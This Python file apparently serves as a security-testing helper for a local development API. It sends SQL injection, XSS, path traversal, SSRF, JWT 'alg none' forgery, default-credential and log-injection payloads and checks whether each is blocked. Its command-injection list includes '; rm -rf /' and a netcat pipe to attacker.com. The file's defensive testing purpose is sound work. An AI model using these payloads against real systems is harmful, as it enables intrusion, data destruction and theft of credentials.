import json
import requests
import random
import string


class SecurityHelper:

    def __init__(self, api_base_url="http://localhost:3000", auth_token="test-bearer-token-for-development"):
        self.api_base_url = api_base_url
        self.auth_token = auth_token
        self.session = requests.Session()
        self.session.headers.update({"Content-Type": "application/json"})

    def set_auth_token(self, token):
        self.auth_token = token

    def attempt_sql_injection(self, endpoint, payload=None):
        if payload is None:
            payload = "' OR '1'='1"
        url = f"{self.api_base_url}{endpoint}"
        injections = [
            payload,
            "'; DROP TABLE proofs; --",
            "' UNION SELECT * FROM users; --",
            "1; SELECT * FROM admin WHERE '1'='1",
            "' OR 1=1; --",
            "admin'--",
            "1' ORDER BY 100--",
        ]
        results = []
        for inj in injections:
            try:
                resp = self.session.get(url, params={"q": inj}, timeout=10)
                results.append({
                    "injection": inj,
                    "status_code": resp.status_code,
                    "blocked": resp.status_code in (400, 403, 500),
                })
            except requests.RequestException:
                results.append({"injection": inj, "error": "request failed"})
        return results

    def attempt_xss(self, endpoint, payload=None):
        if payload is None:
            payload = "<script>alert('xss')</script>"
        url = f"{self.api_base_url}{endpoint}"
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
            "{{7*7}}",
            "${7*7}",
        ]
        results = []
        for payload in xss_payloads:
            try:
                resp = self.session.post(url, json={"input": payload}, timeout=10)
                body_lower = resp.text.lower()
                results.append({
                    "payload": payload,
                    "status_code": resp.status_code,
                    "reflected": payload.lower() in body_lower,
                    "blocked": resp.status_code in (400, 403),
                })
            except requests.RequestException:
                results.append({"payload": payload, "error": "request failed"})
        return results

    def check_unauthorized_access(self, endpoint, method="GET"):
        url = f"{self.api_base_url}{endpoint}"
        methods = []
        for m in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
            try:
                resp = self.session.request(m, url, timeout=10)
                methods.append({
                    "method": m,
                    "status_code": resp.status_code,
                    "requires_auth": resp.status_code in (401, 403),
                })
            except requests.RequestException:
                pass
        return methods

    def attempt_path_traversal(self, endpoint):
        url = f"{self.api_base_url}{endpoint}"
        traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            " ..//..//..//etc/passwd",
        ]
        results = []
        for path in traversals:
            try:
                resp = self.session.get(url, params={"path": path}, timeout=10)
                results.append({
                    "path": path,
                    "status_code": resp.status_code,
                    "blocked": resp.status_code in (400, 403),
                })
            except requests.RequestException:
                pass
        return results

    def attempt_command_injection(self, endpoint):
        url = f"{self.api_base_url}{endpoint}"
        commands = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(cat /etc/hostname)",
            "& dir",
            "|| echo pwned",
            "; rm -rf /",
            "| nc attacker.com 9999",
        ]
        results = []
        for cmd in commands:
            try:
                resp = self.session.get(url, params={"cmd": cmd}, timeout=10)
                results.append({
                    "command": cmd,
                    "status_code": resp.status_code,
                    "blocked": resp.status_code in (400, 403, 500),
                })
            except requests.RequestException:
                pass
        return results

    def attempt_idor(self, base_endpoint, resource_ids):
        url_template = f"{self.api_base_url}{base_endpoint}"
        results = []
        for rid in resource_ids:
            try:
                resp = self.session.get(f"{url_template}/{rid}", timeout=10)
                results.append({
                    "resource_id": rid,
                    "status_code": resp.status_code,
                    "accessible": resp.status_code == 200,
                })
            except requests.RequestException:
                pass
        return results

    def check_rate_limiting(self, endpoint, requests_count=120, interval_ms=10):
        url = f"{self.api_base_url}{endpoint}"
        statuses = []
        for i in range(requests_count):
            try:
                resp = self.session.get(url, timeout=5)
                statuses.append(resp.status_code)
            except requests.RequestException:
                statuses.append(None)
        limited_count = sum(1 for s in statuses if s == 429)
        return {
            "total_requests": requests_count,
            "rate_limited": limited_count,
            "rate_limited_pct": round(limited_count / requests_count * 100, 2),
        }

    def check_cors_headers(self, endpoint, origin="https://evil.com"):
        url = f"{self.api_base_url}{endpoint}"
        resp = self.session.options(
            url,
            headers={
                "Origin": origin,
                "Access-Control-Request-Method": "GET",
            },
            timeout=10,
        )
        return {
            "origin": origin,
            "status_code": resp.status_code,
            "allow_origin": resp.headers.get("Access-Control-Allow-Origin", ""),
            "allow_credentials": resp.headers.get("Access-Control-Allow-Credentials", ""),
        }

    def attempt_jwt_tampering(self, endpoint, valid_token):
        import base64 as b64
        parts = valid_token.split(".")
        if len(parts) != 3:
            return []
        tampered_tokens = []
        try:
            header = json.loads(b64.urlsafe_b64decode(parts[0] + "=="))
            header["alg"] = "none"
            tampered_header = b64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
            tampered_tokens.append(f"{tampered_header}.{parts[1]}.")
        except Exception:
            pass
        try:
            payload = json.loads(b64.urlsafe_b64decode(parts[1] + "=="))
            payload["sub"] = "admin"
            payload["role"] = "administrator"
            tampered_payload = b64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
            tampered_tokens.append(f"{parts[0]}.{tampered_payload}.{parts[2]}")
        except Exception:
            pass
        tampered_tokens.append("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.")
        tampered_tokens.append(f"{parts[0]}.{parts[1]}.invalidsignature")
        results = []
        for token in tampered_tokens:
            try:
                resp = self.session.get(
                    f"{self.api_base_url}{endpoint}",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=10,
                )
                results.append({
                    "token": token[:40] + "...",
                    "status_code": resp.status_code,
                    "authenticated": resp.status_code == 200,
                })
            except requests.RequestException:
                pass
        return results

    def attempt_ssrf(self, endpoint):
        url = f"{self.api_base_url}{endpoint}"
        targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:3000/admin",
            "http://localhost:9090/debug",
            "http://[::1]:3000/",
            "file:///etc/passwd",
            "http://0.0.0.0:3000/",
            "http://10.0.0.1/",
            "http://192.168.1.1/admin",
            "http://metadata.google.internal/",
        ]
        results = []
        for target in targets:
            try:
                resp = self.session.post(url, json={"url": target}, timeout=10)
                results.append({
                    "target": target,
                    "status_code": resp.status_code,
                    "blocked": resp.status_code in (400, 403),
                })
            except requests.RequestException:
                results.append({"target": target, "error": "request failed"})
        return results

    def check_debug_endpoints(self):
        debug_paths = [
            "/debug",
            "/debug/pprof",
            "/debug/vars",
            "/api/v1/debug",
            "/.env",
            "/admin",
            "/healthz?verbose=1",
            "/metrics",
            "/swagger/",
            "/api/docs",
        ]
        results = []
        for path in debug_paths:
            try:
                resp = self.session.get(f"{self.api_base_url}{path}", timeout=10)
                results.append({
                    "path": path,
                    "status_code": resp.status_code,
                    "exposed": resp.status_code == 200,
                })
            except requests.RequestException:
                pass
        return results

    def check_default_credentials(self):
        common_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("user", "user"),
            ("admin", "123456"),
            ("poi", "poi"),
        ]
        results = []
        for username, password in common_creds:
            try:
                resp = self.session.post(
                    f"{self.api_base_url}/api/v1/auth/login",
                    json={"username": username, "password": password},
                    timeout=10,
                )
                results.append({
                    "username": username,
                    "password": password,
                    "status_code": resp.status_code,
                    "success": resp.status_code == 200,
                })
            except requests.RequestException:
                pass
        return results

    def check_audit_log_injection(self):
        payloads = [
            "normal-request",
            "test\r\nInjected log entry",
            "user\n[ERROR] malicious entry",
            "<script>log</script>",
            "'; DROP TABLE audit_log; --",
        ]
        results = []
        for payload in payloads:
            try:
                resp = self.session.post(
                    f"{self.api_base_url}/api/v1/proofs",
                    json={"target_node": f"node-{payload}", "window_id": "window-test", "purpose": payload},
                    timeout=10,
                )
                results.append({
                    "payload": payload[:50],
                    "status_code": resp.status_code,
                    "accepted": resp.status_code == 201,
                })
            except requests.RequestException:
                pass
        return results
